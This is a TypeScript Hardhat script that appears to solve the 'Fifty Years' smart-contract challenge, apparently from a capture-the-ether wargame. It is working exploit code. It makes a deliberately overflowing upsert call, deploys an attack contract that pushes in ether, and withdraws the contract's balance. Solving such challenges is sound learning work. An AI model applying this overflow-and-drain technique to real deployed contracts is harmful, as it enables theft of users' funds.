import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0xffb3Cf5F68A00B29b40b19e97cF06A74789d6732";

async function main() {
  const TargetFactory = await ethers.getContractFactory("FiftyYearsChallenge");
  const target = TargetFactory.attach(contractAddress);

  const PRE_OVERFLOW = BigNumber.from(2)
    .pow(256)
    .sub(24 * 60 * 60);

  let tx;
  tx = await target.upsert(1, PRE_OVERFLOW, { value: 1 });
  await tx.wait();

  tx = await target.upsert(2, 0, { value: 2 });
  await tx.wait();

  const AttackFactory = await ethers.getContractFactory("FiftyYearsAttack");
  const attack = await AttackFactory.deploy(target.address, { value: 2 });
  await attack.deployed();

  tx = await target.withdraw(2);
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
